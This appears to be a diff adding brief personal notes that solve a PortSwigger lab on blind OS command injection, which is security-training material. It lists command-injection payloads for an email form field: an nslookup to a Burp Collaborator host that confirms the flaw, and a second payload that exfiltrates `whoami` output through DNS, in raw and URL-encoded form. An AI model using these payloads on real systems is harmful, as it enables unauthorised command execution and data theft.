@@ -1,0 +1,12 @@
+Link: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
+
+
+collaborator: m2pb9kg32sux345dge6rplf6ixoocg05.oastify.com
+
+step 1: check for vulnerable payload
+    -> payload: & nslookup m2pb9kg32sux345dge6rplf6ixoocg05.oastify.com #
+    -> email=tes%40tes.com%26+nslookup+m2pb9kg32sux345dge6rplf6ixoocg05.oastify.com+%23
+
+step 2: run command
+    -> & nslookup `whoami`.m2pb9kg32sux345dge6rplf6ixoocg05.oastify.com #
+    -> email=tes%40tes.com%26+nslookup+`whoami`.m2pb9kg32sux345dge6rplf6ixoocg05.oastify.com+%23
